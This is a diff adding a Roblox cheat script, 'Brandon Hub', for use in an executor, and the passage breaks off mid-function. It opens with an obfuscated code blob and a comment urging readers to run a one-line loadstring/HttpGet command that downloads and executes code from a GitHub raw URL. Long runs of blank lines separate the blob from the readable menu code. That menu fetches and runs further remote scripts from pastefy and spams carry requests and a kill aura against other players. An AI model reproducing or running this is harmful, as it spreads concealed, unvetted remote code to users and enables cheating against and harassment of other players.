@@ -1,1 +1,3497 @@
---[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local T={"\079\088\084\082\089\076\072\061";"\071\074\101\106\079\047\075\121\071\101\061\061";"\117\077\090\121\089\088\104\106\056\049\061\061","\079\117\111\118\089\076\072\061";"\066\114\109\109\103\101\061\061","\079\114\077\109\054\119\107\075","\054\119\122\074\089\119\073\061";"\098\103\117\086\106\104\043\073\056\121\052\052\099\112\068\075\082\054\099\072\067\088\049\054\098\107\068\076\117\087\120\057\106\049\118\053\098\085\088\047\049\053\114\051\066\115\054\103\050\084\051\082\052\084\055\071\085\056\099\082\120\065\051\057\117\121\053\077\087\078\069\113\079\097\081\110\047\111\110\075\104\066\090\085\087\105\055\118\083\114\116\055\119\076\055\054\113\077\079\097\073\047\086\110\065\079\065\110\115\047\070\102\087\071\087\057\079\097\112\048\104\111\122\090\085\099\061\061","\079\114\122\087\079\110\061\061","\107\114\122\099\103\083\090\115\073\077\121\087\120\076\066\099","\089\088\067\099\054\083\077\071\069\119\054\116\054\114\079\057";"\083\119\111\079\073\073\104\075\069\086\079\053\066\073\121\083";"\117\077\090\087\079\117\104\109\054\119\122\074\089\119\073\061";"\117\077\090\113\079\083\057\061","\104\120\121\053\120\098\109\070\079\122\079\107\103\050\111\109\069\110\061\061","\103\076\104\118\053\083\052\098";"\079\076\121\106\054\077\054\080\120\106\104\047\097\119\109\107\069\050\057\061";"\117\077\090\098\066\099\061\061";"\054\119\090\055\054\078\111\121\089\088\103\061";"\053\114\054\055\054\120\085\083\053\097\104\115";"\120\119\122\087\103\119\120\118\072\067\104\106\054\119\120\051\054\119\120\065\072\110\061\061";"\089\086\072\061","\103\119\107\109\089\119\099\061","\053\120\106\086\103\088\101\114\083\078\054\109\073\119\120\099\066\073\069\061","\054\065\052\113\107\106\107\066\079\076\109\051\070\076\111\052\073\088\057\061";"\089\119\090\109\079\078\107\050\103\088\106\102\079\099\061\061","\103\088\122\102\079\119\090\087";"\089\086\067\061","\089\076\111\051\053\073\104\106\069\088\107\072\079\077\121\110\056\101\061\061";"\054\088\057\050\054\122\109\097\120\077\049\077\066\088\122\078\104\049\061\061";"\103\097\106\085\083\065\084\072\103\073\106\111\053\119\073\077\104\065\067\061","\054\083\052\099\066\083\107\043","\069\078\110\084\083\083\107\052\070\065\120\072\073\106\085\080\120\106\103\061";"\070\078\104\050\103\067\054\106\054\049\061\061","\089\083\122\050\053\049\061\061","\103\088\120\087\089\076\079\106","\120\077\079\122\053\073\052\051\107\120\107\085\079\050\079\097";"\054\097\122\067\073\067\068\099\070\086\106\119\089\110\061\061","";"\054\119\090\102\054\083\077\074\079\117\072\061";"\066\114\090\102\066\114\122\050","\066\077\107\084\056\122\120\066\069\073\079\113\089\117\110\057\066\110\061\061","\071\101\061\061","\089\119\120\102";"\079\076\107\077\066\101\061\061","\103\114\120\050\089\083\120\050\066\117\104\109\066\088\084\106";"\066\098\106\050\079\110\061\061"}local function g(g)return T[g+(447912-411868)]end for g,y in ipairs({{597667+-597666;156156-156109},{636328+-636327,-412609-(-412617)},{-900673+900682;-122360-(-122407)}})do while y[420223-420222]<y[285721+-285719]do T[y[731279-731278]],T[y[-876828-(-876830)]],y[-921413+921414],y[-790843-(-790845)]=T[y[762099-762097]],T[y[503773-503772]],y[991325-991324]+(-141075-(-141076)),y[-111033+111035]-(226887+-226886)end end do local g=string.len local y=string.sub local Z=table.concat local V=type local I=table.insert local R=T local p={I=217676-217656;d=40613+-40571,["\047"]=1022145-1022143,P=37176-37161,["\050"]=548735-548683,["\054"]=-136143+136172;k=-374774+374787;["\052"]=-471555+471612,["\057"]=688165+-688109,["\053"]=-614958+614984,F=-397164+397182,l=-676047+676110;v=529078-529028,E=-440494-(-440506);o=954994-954985,g=772566+-772538,b=-372183-(-372222);A=771551-771515;W=-967753-(-967798),B=36780+-36756,a=296042-296023;V=-46801+46804;N=-188487+188494;u=203067-203044,s=-836107+836165;Z=-263711+263772;O=1005331+-1005306;f=-128792-(-128838),m=-304690-(-304723);X=-152203-(-152241),z=-132537+132542,["\055"]=-765056-(-765107);M=-962532+962585;t=2594+-2584;c=918972+-918924,U=-951894-(-951895),["\051"]=406666-406631,J=845377-845343;C=-258958+258962,["\048"]=-849814+849825,G=16434-16420;K=979001-978961,e=-837901-(-837933),["\043"]=366169+-366126;H=-205350+205358,Y=579713-579686;y=905489+-905448,S=816817-816795,w=-180445+180451,p=-474388+474419,q=-157950+157994,Q=-396883-(-396945);n=-554131+554147;L=-511635+511690;["\049"]=-208840+208840,h=-447350+447367;D=-895240-(-895300);R=543527+-543480;i=483974-483915,x=294142-294121,j=656031+-655994;r=36707+-36653,T=-741350-(-741399),["\056"]=-187244-(-187274)}local X=string.char local S=math.floor for T=918111-918110,#R,-924021+924022 do local i=R[T]if V(i)=="\115\116\114\105\110\103"then local V=g(i)local t={}local n=-229195+229196 local z=702569-702569 local J=-83852-(-83852)while n<=V do local T=y(i,n,n)local g=p[T]if g then z=z+g*(461763+-461699)^((-88029+88032)-J)J=J+(367200-367199)if J==161846+-161842 then J=879817+-879817 local T=S(z/(885043-819507))local g=S((z%(810922+-745386))/(-944701+944957))local y=z%(-812824+813080)I(t,X(T,g,y))z=-286802-(-286802)end elseif T=="\061"then I(t,X(S(z/(678987-613451))))if n>=V or y(i,n+(-110866+110867),n+(389342-389341))~="\061"then I(t,X(S((z%(-717176+782712))/(-196258+196514))))end break end n=n+(135925-135924)end R[T]=Z(t)end end end return(function(T,Z,V,I,R,p,X,y,n,k,K,z,i,x,o,e,H,S,M,J,m,t)x,y,M,S,i,n,o,z,H,m,k,K,e,t,J=function(T,g)local Z=z(g)local V=function(...)return y(T,{...},g,Z)end return V end,function(y,V,I,R)local Q,U,u,x,q,w,G,N,L,J,i,c,P,E,j,D,A,X,z,s,F,n,C,f,d,v,W,B,a,b,h,Y,r,O while y do if y<-1035173+10427557 then if y<3874929-(-824265)then if y<1404099-(-934620)then if y<-137094+1168365 then if y<28579+604583 then if y<-950462+1469574 then if y<-362524-(-847786)then y=666432+4710798 z=S[I[-82020+82026]]n=z==i X=n else F=-63951-(-63951)W=#G d=W==F y=d and 6939053-665595 or 472930+6491370 end else z=-519210+519319 y=877176+12552178 n=S[I[-631145+631148]]i=n*z n=-349813+350070 X=i%n S[I[742153+-742150]]=X end else if y<607769+213848 then i=V[-563724+563725]n=V[796266+-796264]y=S[I[-982343-(-982344)]]z=y y=z[n]y=y and 14182670-(-1019907)or-478187+11214162 else U=S[n]y=U and 2226678-832322 or 1866588-(-474174)X=U end end else if y<1088857-(-470517)then if y<517451-(-857013)then S[n]=D y=S[n]y=y and-307805+15088301 or-508442+14457591 else u=703691+-703690 h=A[u]Y=y u=false B=h==u y=B and-572549+4317043 or 13150842-847954 U=B end else if y<2589876-441304 then i=g(665714+-701746)y=T[i]z=763451-763451 n=S[I[-314348+314356]]i=y(n,z)y=286078+9097126 else X={}y=T[g(-21342-14670)]end end end else if y<379634+3481632 then if y<2130505-(-889813)then if y<-430363+3308798 then if y<3129755-783015 then S[n]=X y=-421210+3361284 else y=-141179+15535353 a=S[x]X=a end else q=M(q)r=M(r)f=M(f)L=M(L)y=11344313-(-9685)w=M(w)E=M(E)A=nil end else if y<3893272-178941 then q=t()S[q]=D L=g(-507134+471133)s=-947921+957921 w=208982-208882 E=-968274+968529 f=961373+-961372 c=-629763-(-629763)B=g(854361+-890378)X=T[L]L=g(238641-274650)y=X[L]L=533390-533389 X=y(L,w)L=t()S[L]=X w=874566-874566 y=S[N]X=y(w,E)w=t()E=-905928-(-905929)S[w]=X y=S[N]r=S[L]X=y(E,r)E=t()S[E]=X A=29464-29462 X=S[N]r=X(f,A)X=1025448-1025447 y=r==X X=g(205147-241181)r=t()S[r]=y Y=T[B]A=g(-819263-(-783223))h=S[N]u={h(c,s)}B=Y(Z(u))Y=g(-311212-(-275172))U=B..Y f=A..U y=g(-72753-(-36715))y=d[y]y=y(d,X,f)A=g(-599412+563399)f=t()U=K(52116+14384992,{N;q,v;z;n;W;r;f;L;E,w,P})S[f]=y X=T[A]A={X(U)}y={Z(A)}A=y y=S[r]y=y and 788516-(-97030)or 343846+12421936 else y=-1031841+13334729 u=-674221+674223 h=A[u]u=S[f]B=h==u U=B end end else if y<60856+4335551 then if y<-909343+5211080 then y=k(6414406-(-22984),{J})j={y()}X={Z(j)}y=T[g(-871381-(-835376))]else q=g(-488933+452925)O=g(-905388-(-869371))y=T[O]F=T[q]O=y(F)y=g(-944962+908948)T[y]=O y=6609738-661877 end else if y<236930+4389656 then v=g(415287+-451291)P=T[v]X=P y=11204898-(-670664)else d=nil J=M(J)x=M(x)v=M(v)z=M(z)N=M(N)y=-630245+15198770 Q=nil z=nil P=M(P)v=t()W=M(W)b=nil N=g(767770-803771)a=nil a=g(-100119+64118)n=M(n)C=nil G=nil b={}x=T[a]n=nil a=g(389779+-425814)J=x[a]x=t()S[x]=J a=T[N]G={}N=g(-969996+933987)Q=g(550739-586768)P=g(-152465+116445)J=a[N]N=T[Q]Q=g(-174909-(-138909))W=80489-80233 a=N[Q]Q=T[P]P=g(825160-861191)N=Q[P]P=t()Q=-262249-(-262249)S[P]=Q Q=176608+-176606 S[v]=Q F=W d=-277246+277247 Q={}W=532233-532232 C=t()S[C]=b q=W b=-312001+312001 W=-371694+371694 L=q<W W=d-q end end end end else if y<-360468+6894971 then if y<536392+5409354 then if y<-829515+6350381 then if y<5519860-134602 then if y<-434951+5314292 then z=g(238863-274892)n=T[z]z=g(-288164+252164)i=n[z]z=S[I[802841+-802840]]n={i(z)}X={Z(n)}y=T[g(-120785-(-84766))]else S[I[-910378-(-910383)]]=X i=nil y=-579958+12468800 end else y=17229718-738692 N=nil a=nil J=nil end else if y<6405890-536205 then z=g(420006-456026)n=t()x=t()i=V y=true Q=m(12408364-260590,{x})N=g(821169+-857182)S[n]=y J=t()X=T[z]z=g(460401+-496431)y=X[z]z=t()S[z]=y y=k(773835+10372006,{})S[J]=y y=false S[x]=y a=T[N]N=a(Q)X=N y=N and 734193+1949460 or 694466+14699708 else z=10608828-715796 n=g(-743742-(-707701))X=452324+10599960 i=n^z y=X-i X=g(917508-953506)i=y y=X/i X={y}y=T[g(870063-906074)]end end else if y<5587556-(-599761)then if y<-258828+6262210 then y=12715949-161228 else y=true y=y and 8529730-277259 or 3246346-(-758751)end else if y<7063641-677449 then L=g(1015251+-1051288)b=nil w={}d={}W=t()S[W]=d d=t()F=e(8052853-440307,{W;P;v;x})q=t()b=30690888384547-(-620464)r=g(-537063+501030)S[d]=F A=g(-72613+36590)N=nil B=nil a=nil F={}J=nil X={}Q=nil N=g(565370+-601397)S[q]=F F=T[L]f=S[q]E={[r]=f;[A]=B}L=F(w,E)n=L F=H(1594017-959966,{q,W,C;P,v;d})v=M(v)C=M(C)q=M(q)v=g(34064-70092)x=M(x)P=M(P)G=nil W=M(W)y=T[g(-980163+944138)]x=g(-88469+52459)d=M(d)J=T[x]a=T[N]z=F P=z(v,b)Q=n[P]n=nil P=g(919837+-955839)P=a[P]z=nil N={P(a,Q)}x=J(Z(N))J=x()else y=9112347-619497 end end end else if y<326183+8139159 then if y<7392841-(-158220)then if y<541420+6424896 then if y<6393992-(-555933)then j=S[n]D=j y=j and 12403899-56088 or-538732+1857300 else W=264261-264260 w=-789317+789318 F=#G d=J(W,F)W=a(G,d)y=-486925-(-987288)F=S[C]L=W-w q=N(L)d=nil F[W]=q W=nil end else O=g(-928494-(-892474))j=T[O]Q=v O=g(843152-879188)D=j[O]j=D(i,Q)D=S[I[737170-737164]]y=245794+13349797 O=D()W=j+O d=W+a O=265262-265261 W=-40041+40297 G=d%W W=z[n]Q=nil a=G j=a+O D=J[j]d=W..D z[n]=d end else if y<8158214-216117 then i=S[I[166455-166454]]X=#i i=262159-262159 y=X==i y=y and 10557160-(-549882)or 5653069-945944 else y=11588149-(-966572)end end else if y<462404+8634804 then if y<989190+7544304 then y=true y=y and 8338623-(-805541)or 12043573-302982 else F=g(-753963+717949)y=T[F]F=g(987179+-1023187)T[F]=y y=6654467-706606 end else if y<648178+8585408 then X=g(-227591-(-191577))i=g(206804-242812)y=T[X]X=T[i]i=g(-559868+523860)T[i]=y y=651949+7840901 i=g(-514419-(-478405))T[i]=X i=S[I[889230-889229]]n=i()else n=-250170+250171 y={}z=S[I[-755373+755382]]J=z z=661936+-661935 x=z z=-449511-(-449511)a=x<z i=y z=n-x y=-654685+14116613 end end end end end else if y<11758965-(-777800)then if y<11686464-229967 then if y<11508725-425009 then if y<479781+10210220 then if y<-838093+11013013 then if y<-385645+10478701 then y=X and-797953+13333652 or 11341348-(-547494)else F=-20456+20462 O=-829133+829134 y=S[N]j=y(O,F)F=g(554276-590290)y=g(176883-212897)T[y]=j O=T[F]F=-490583+490585 y=O>F y=y and 5350424-1005137 or-286841+8915945 end else G=g(248547+-284576)C=T[G]y=10586424-(-597930)G=g(-295757+259753)b=C[G]P=b end else if y<929803+9910010 then v=270701-270700 y={}S[I[-434837+434839]]=y N=853393-853138 X=S[I[-626156+626159]]x=-831584+35184372920416 J=X X=n%x S[I[-501856+501860]]=X a=n%N N=-522895-(-522897)x=a+N S[I[-844244+844249]]=x Q=g(-325377-(-289357))N=T[Q]Q=g(256166+-292205)a=N[Q]b=v N=a(i)a=g(1030860+-1066857)y=13284866-(-310725)z[n]=a Q=1018038-1018037 a=-943301-(-943526)P=N v=568496+-568496 C=b<v v=Q-b else y=S[I[493714+-493704]]n=S[I[980863-980852]]i[y]=n y=S[I[451503-451491]]n={y(i)}y=T[g(-840955-(-804948))]X={Z(n)}end end else if y<10574790-(-589024)then if y<251426+10880391 then z=-458294-(-458459)n=S[I[978846+-978844]]i=n*z n=747156+31766445577011 X=i+n i=-744141+35184372832973 y=X%i S[I[-105563-(-105565)]]=y i=S[I[-942020+942023]]n=450342-450341 y=504215-(-123525)X=i~=n else i=g(325607+-361622)X=g(-905360+869328)y=T[X]X=y(i)X={}y=T[g(906791+-942794)]end else if y<11803416-564980 then X=P y=v y=P and-371491+12247053 or 5054390-618271 else D=D+O q=not F X=D<=j X=q and X q=D>=j q=F and q X=q or X q=2652309-(-460706)y=X and q X=-900923+7489293 y=y or X end end end else if y<11215625-(-948717)then if y<980462+10946830 then if y<-317850+12195946 then if y<10906281-(-858830)then y=T[g(548796-584820)]X={}else P=t()v=945085+-945082 b=668915+-668850 S[P]=X y=S[N]O=g(683196-719213)X=y(v,b)y=643471+-643471 v=t()S[v]=X b=y G=g(-1035395+999382)y=56438-56438 d=o(5655421-(-259832),{})X=T[G]C=y G={X(d)}X=-275122-(-275124)y={Z(G)}G=y y=G[X]X=g(497827+-533870)d=y y=T[X]W=S[z]j=T[O]O=j(d)j=g(862413-898447)D=W(O,j)W={D()}X=y(Z(W))W=t()S[W]=X X=224654-224653 D=S[v]j=D D=-648697-(-648698)O=D y=11795303-441305 D=-754757-(-754757)F=O<D D=X-O end else y=S[I[242585-242578]]y=y and 2272487-671150 or 159189+9224015 end else if y<12620098-482887 then S[n]=U c=-743517-(-743518)u=S[E]h=u+c B=A[h]Y=b+B B=-45682-(-45938)y=Y%B b=y h=S[w]B=C+h h=-925148+925404 y=2525463-(-414611)Y=B%h C=Y else y=true S[I[44812-44811]]=y X={}y=T[g(1026407+-1062428)]end end else if y<-177132+12485676 then if y<12863844-619118 then X=-73646+14735805 z=15274182-737953 n=g(79855+-115871)i=n^z y=X-i i=y X=g(900120-936146)y=X/i X={y}y=T[g(779524-815530)]else X=U y=Y y=1634422-(-706340)end else if y<-558864+12998799 then y=-1043985+2362553 j=b==C D=j else X=g(641576+-677619)J=g(-826169+790152)Q=g(-735129-(-699116))y=T[X]i=S[I[1031087+-1031083]]z=T[J]P=K(13016385-829061,{})N=T[Q]Q={N(P)}N=-955491+955493 a={Z(Q)}x=a[N]J=z(x)z=g(-320751+284717)n=i(J,z)i={n()}X=y(Z(i))i=X n=S[I[-621206+621211]]y=n and 1086463-1041540 or-981220+6358450 X=n end end end end else if y<15169931-1033946 then if y<13931433-499501 then if y<12470136-(-336116)then if y<13436632-672138 then if y<13171020-490669 then y=true y=y and 9833049-(-341209)or 1777306-(-545006)else B=-146700-(-146701)y=12764863-685031 Y=A[B]U=Y end else Y=S[n]y=Y and 12063535-(-655020)or 11318656-(-761176)U=Y end else if y<12748587-(-360899)then F=657070-657070 W=#G d=W==F y=-516869+7481169 else z=-899046+899047 n=S[I[-628582+628585]]i=n~=z y=i and-134912+15016295 or 771046-143306 end end else if y<14334905-493186 then if y<19580+13547464 then z=z+x n=z<=J N=not a n=N and n N=z>=J N=a and N n=N or n N=602593+15493901 y=n and N n=926996+10153542 y=y or n else v=v+b G=not C Q=v<=P Q=G and Q G=v>=P G=C and G Q=G or Q G=7927321-860271 y=Q and G Q=294719+5094941 y=y or Q end else if y<527605+13419219 then d=W w=d G[d]=w d=nil y=15016857-448332 else y=true y=4274485-269388 end end end else if y<-1044746+16319172 then if y<15596395-745756 then if y<28467+14595969 then if y<-153808+14689359 then x=476345-476343 n=S[I[118165+-118164]]J=-478181-(-478182)z=n(J,x)n=-209634-(-209635)i=z==n y=i and 10238708-735037 or-859899+17260283 X=i else W=W+q w=not L d=W<=F d=w and d w=W>=F w=L and w d=w or d w=14858925-977144 y=d and w d=14120672-1012380 y=y or d end else y=408058+4277762 end else if y<932101+14190587 then b=540509-540496 z=189927-189895 n=S[I[-747565+747568]]i=n%z P=-845573-(-845575)J=S[I[-475491+475495]]N=S[I[246271-246269]]d=S[I[-1036952+1036955]]G=d-i d=663469+-663437 C=G/d v=b-C Q=P^v a=N/Q x=J(a)Q=191017+-191016 J=4294542234-(-425062)z=x%J x=-555586-(-555588)J=x^i n=z/J J=S[I[-20993-(-20997)]]N=n%Q Q=-427472+4295394768 a=N*Q x=J(a)J=S[I[527230-527226]]a=J(n)z=x+a x=-582948+648484 J=z%x N=648960+-583424 P=669809-669553 a=z-J n=nil x=a/N b=-887323-(-887579)N=896696+-896440 a=J%N y=651157+4055968 z=nil Q=J-a J=nil N=Q/P P=-909719-(-909975)Q=x%P v=x-Q i=nil P=v/b v={a,N,Q,P}S[I[-278628+278629]]=v P=nil N=nil Q=nil a=nil x=nil else y=972151+15518875 end end else if y<127279+16129942 then if y<15613254-(-391217)then N=g(338818-374819)a=X X=T[N]N=g(-989054-(-953045))Q=g(-121606+85577)y=X[N]N=t()S[N]=y X=T[Q]Q=g(-966451+930409)y=X[Q]v=y C=g(325032-361061)Q=y b=T[C]y=b and 10607416-184780 or-548966+11733320 P=b else y=S[I[802081-802080]]Q=-92832+92832 n=z P=-212868+213123 N=y(Q,P)y=12798361-(-663567)i[n]=N n=nil end else if y<15558484-(-896698)then n=S[I[-352022+352024]]z=S[I[-347829-(-347832)]]i=n==z y=-875700+10379371 X=i else X={n}y=T[g(-556443-(-520444))]end end end end end end end y=#R return Z(X)end,function(T)i[T]=i[T]-(-956955-(-956956))if i[T]==892842+-892842 then i[T],S[T]=nil,nil end end,{},{},-196123+196123,function(T,g)local Z=z(g)local V=function(V,I,R)return y(T,{V;I,R},g,Z)end return V end,function(T)for g=-318015+318016,#T,-585548+585549 do i[T[g]]=(-701907-(-701908))+i[T[g]]end if V then local y=V(true)local Z=R(y)Z[g(115546-151579)],Z[g(-89166-(-53148))],Z[g(363704+-399726)]=T,J,function()return 361104+-4500195 end return y else return I({},{[g(-537168+501150)]=J,[g(-676648-(-640615))]=T;[g(1046176+-1082198)]=function()return 732977+-4872068 end})end end,function(T,g)local Z=z(g)local V=function(V,I,R,p,X,S)return y(T,{V,I,R;p;X;S},g,Z)end return V end,function(T,g)local Z=z(g)local V=function(V,I,R,p)return y(T,{V,I,R;p},g,Z)end return V end,function(T,g)local Z=z(g)local V=function(V)return y(T,{V},g,Z)end return V end,function(T,g)local Z=z(g)local V=function(V,I)return y(T,{V,I},g,Z)end return V end,function(T,g)local Z=z(g)local V=function(V,I,R,p,X)return y(T,{V,I,R;p;X},g,Z)end return V end,function()n=n+(1044543-1044542)i[n]=-873936-(-873937)return n end,function(T)local g,y=-1040201+1040202,T[849295-849294]while y do i[y],g=i[y]-(-695734+695735),g+(21410-21409)if i[y]==756330+-756330 then i[y],S[y]=nil,nil end y=T[g]end end return(x(4801950-(-1004180),{}))(Z(X))end)(getfenv and getfenv()or _ENV,unpack or table[g(511685+-547689)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+-- security vanguard script is hidden
+-- execute this on delta for script to load: loadstring(game:HttpGet("https://raw.githubusercontent.com/girhubsccountv-hue/boysandgirls/refs/heads/main/brandonhub"))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- Rayfield UI Library
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+workspace.FallenPartsDestroyHeight = -50000
+
+-- Services
+Players = game:GetService("Players")
+ReplicatedStorage = game:GetService("ReplicatedStorage")
+UserInputService = game:GetService("UserInputService")
+localPlayer = Players.LocalPlayer
+
+-- Put this in a LocalScript inside StarterPlayerScripts or StarterGui
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local starterGui = game:GetService("StarterGui")
+
+-- 1. Force the inventory to be enabled when the script starts
+starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+
+-- 2. Create a loop to keep it visible
+-- Some games try to hide it again, so we need to constantly check
+task.spawn(function()
+    while true do
+        -- Check if the backpack is currently disabled
+        if not starterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
+            -- If it's disabled, re-enable it immediately
+            starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+        end
+        -- Wait a short time before checking again (0.1 seconds is smooth)
+        task.wait(0.1)
+    end
+end)
+
+-- Variables
+spamCarryEnabled = false
+killAuraEnabled = false
+stopCarryEnabled = false
+spamCarryThread = nil
+killAuraThread = nil
+stopCarryThread = nil
+carryName = "BrandonHubb"
+
+_G.CarrySpeed = 100
+_G.AuraSpeed = 100
+
+-- Create Window
+local Window = Rayfield:CreateWindow({
+    Name = "Brandon Hub | Huge Update Soon",
+    LoadingTitle = "Loading Brandon Hub...",
+    LoadingSubtitle = "by TMK_Brandon!",
+    Theme = "Amethyst",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "BrandonHub",
+        FileName = "BrandonConfig"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "noinvitelink",
+        RememberJoins = true
+    },
+    KeySystem = false
+})
+
+local MainTab = Window:CreateTab("PVP & Carry Spam", nil)
+
+local  newhitspammersection = MainTab:CreateSection("Youtube Music Player")
+
+local Button = MainTab:CreateButton({
+   Name = "Music Player V8 (Not by me but very cool script)",
+   Callback = function()
+       loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/Youtube%20Music%20Player/YoutubeMusicPlayer.lua'),true))()
+   end,
+})
+
+local  newhitspammersection = MainTab:CreateSection("Brandon Hub GUIs (New!)")
+
+local Button = MainTab:CreateButton({
+   Name = "Open Selectable Carry Spam GUI",
+   Callback = function()
+       loadstring(game:HttpGet("https://pastefy.app/itIsx7mg/raw"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Open Selectable Kill Aura GUI",
+   Callback = function()
+       loadstring(game:HttpGet("https://pastefy.app/ktNlTb4k/raw"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Open Pet Animator GUI",
+   Callback = function()
+       loadstring(game:HttpGet("https://pastefy.app/3TgdIsjK/raw"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Open Grabber GUI",
+   Callback = function()
+       loadstring(game:HttpGet("https://pastefy.app/x2ig541u/raw"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Open Hit Spammer GUI (Best Kill Aura) (OP for 1v1)",
+   Callback = function()
+       loadstring(game:HttpGet("https://pastefy.app/46Q8Zqtd/raw"))()
+   end,
+})
+
+local Label = MainTab:CreateLabel("Partial usernames work, display names don't work, this spam's kill aura on the user you choose!", nil) -- Title, Icon, Color, IgnoreTheme
+
+local CoreSection = MainTab:CreateSection("Semi GodMode")
+
+-- Variables
+local isSpamming = false
+local emoteLoop = nil
+local emoteId = 134769837801223
+
+-- Function to perform emote
+local function performEmote()
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if character then
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            -- Load and play the emote animation
+            local animation = Instance.new("Animation")
+            animation.AnimationId = "rbxassetid://" .. emoteId
+            local animTrack = humanoid:LoadAnimation(animation)
+            animTrack:Play()
+        end
+    end
+end
+
+-- Function to start the emote loop
+local function startEmoteLoop()
+    emoteLoop = task.spawn(function()
+        while isSpamming do
+            performEmote()
+            task.wait(3) -- Wait 3 seconds before next emote
+        end
+    end)
+end
+
+-- Function to toggle emote spam
+local function toggleEmoteSpam()
+    isSpamming = not isSpamming
+    
+    if isSpamming then
+        startEmoteLoop()
+        Rayfield:Notify({
+            Title = "Emote Spam",
+            Content = "Started! Playing emote every 3 seconds",
+            Duration = 3,
+        })
+    else
+        if emoteLoop then
+            task.cancel(emoteLoop)
+            emoteLoop = nil
+        end
+        Rayfield:Notify({
+            Title = "Emote Spam",
+            Content = "Stopped!",
+            Duration = 3,
+        })
+    end
+end
+
+-- Create toggle
+MainTab:CreateToggle({
+    Name = "Emote Godmode (MID)",
+    CurrentValue = false,
+    Flag = "EmoteToggle",
+    Callback = function(Value)
+        toggleEmoteSpam()
+    end,
+})
+
+MainTab:CreateParagraph({
+    Title = "Information",
+    Content = "It basically keeps moving your character at a constant rate, very useful when fighting"
+})
+
+-- Core Features Section
+local CoreSection = MainTab:CreateSection("Carrying Vulnerability")
+
+-- Carry Name Input
+local CarryNameInput = MainTab:CreateInput({
+    Name = "Carry Name",
+    PlaceholderText = "Enter carry name...",
+    RemoveTextAfterFocus = false,
+    CurrentValue = carryName,
+    Flag = "CarryNameInput",
+    Callback = function(Value)
+        carryName = Value
+        Rayfield:Notify({
+            Title = "Carry Name Updated",
+            Content = "New carry name: " .. carryName,
+            Duration = 2,
+        })
+    end,
+})
+
+-- Request Everyone Once Button
+local RequestOnceButton = MainTab:CreateButton({
+    Name = "Request Everyone Once",
+    Callback = function()
+        local RequestPrompt = ReplicatedStorage:FindFirstChild("RequestPrompt")
+        if not RequestPrompt then
+            Rayfield:Notify({
+                Title = "Error",
+                Content = "RequestPrompt not found!",
+                Duration = 3,
+            })
+            return
+        end
+        
+        local players = Players:GetPlayers()
+        local count = 0
+        
+        for _, player in ipairs(players) do
+            if player ~= localPlayer then
+                local args = {70932517024004, carryName, player, 0, 0.75, -1.5, 0, 0, 0}
+                pcall(function() 
+                    RequestPrompt:FireServer(unpack(args))
+                    count = count + 1
+                end)
+            end
+        end
+        
+        Rayfield:Notify({
+            Title = "Requests Sent",
+            Content = "Sent to " .. count .. " players with name: " .. carryName,
+            Duration = 3,
+        })
+    end,
+})
+
+-- Spam Carry Toggle
+local SpamCarryToggle = MainTab:CreateToggle({
+    Name = "Spam Carry (Auto)",
+    CurrentValue = false,
+    Flag = "SpamCarryToggle",
+    Callback = function(Value)
+        spamCarryEnabled = Value
+        local RequestPrompt = ReplicatedStorage:FindFirstChild("RequestPrompt")
+        
+        if Value then
+            if not RequestPrompt then
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "RequestPrompt not found!",
+                    Duration = 3,
+                })
+                return
+            end
+            
+            if spamCarryThread then task.cancel(spamCarryThread) end
+            
+            function getCarryDelay()
+                local speed = _G.CarrySpeed or 100
+                return 0.2 - (0.199 * (speed / 100))
+            end
+            
+            spamCarryThread = task.spawn(function()
+                while spamCarryEnabled do
+                    local players = Players:GetPlayers()
+                    local delay = getCarryDelay()
+                    for _, player in ipairs(players) do
+                        if not spamCarryEnabled then break end
+                        if player ~= localPlayer then
+                            local args = {70932517024004, carryName, player, 0, 0.75, -1.5, 0, 0, 0}
+                            pcall(function() RequestPrompt:FireServer(unpack(args)) end)
+                        end
+                    end
+                    task.wait(delay)
+                end
+            end)
+            
+            Rayfield:Notify({
+                Title = "Spam Carry",
+                Content = "Activated with name: " .. carryName,
+                Duration = 2,
+            })
+        else
+            if spamCarryThread then 
+                task.cancel(spamCarryThread)
